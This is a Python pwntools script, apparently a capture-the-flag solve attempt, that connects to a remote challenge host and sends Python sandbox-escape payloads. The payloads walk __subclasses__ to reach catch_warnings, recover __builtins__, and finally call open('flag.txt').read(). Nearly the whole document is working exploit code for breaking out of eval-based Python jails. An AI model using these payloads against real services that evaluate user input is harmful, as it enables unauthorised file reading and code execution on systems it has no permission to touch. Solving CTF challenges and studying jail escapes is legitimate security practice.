#!/usr/bin/env python3
from pwn import *

host = '212.2.250.33'
port = 30968

def test(payload, desc):
    io = remote(host, port, level='error')
    io.recvuntil(b'>', timeout=2)
    io.sendline(payload.encode())
    time.sleep(0.5)
    response = io.recvall(timeout=2).decode()
    io.close()
    print(f"[*] {desc}")
    print(f"    Payload: {payload[:80]}")
    print(f"    Response: {response.strip()}")
    if 'Kaal{' in response:
        print(f"\n[+] FLAG FOUND: {response}")
        return True
    print()
    return False

# Test object introspection to get to builtins
tests = [
    ("().__class__.__bases__[0].__subclasses__()", "Get subclasses"),
    ("''.__class__.__mro__[1].__subclasses__()", "Get subclasses via string"),
    ("(1).__class__.__bases__[0].__subclasses__()", "Get subclasses via int"),
    ("[x.__name__ for x in ().__class__.__bases__[0].__subclasses__()]", "List subclass names"),
]

for payload, desc in tests:
    if test(payload, desc):
        break

# If we can get subclasses, find one with useful methods
print("\n[*] Trying to find and use file-reading class...")
payload = "[x for x in ().__class__.__bases__[0].__subclasses__() if 'warning' in x.__name__.lower()]"
test(payload, "Find warnings class")

# Try to use catch_warnings to get builtins
payload = "[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]().__enter__().__builtins__"
test(payload, "Get builtins via catch_warnings")

# Try simpler approach - use the class to read file
payload = "[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['open']('flag.txt','r').read()"
if test(payload, "Read flag via catch_warnings"):
    pass
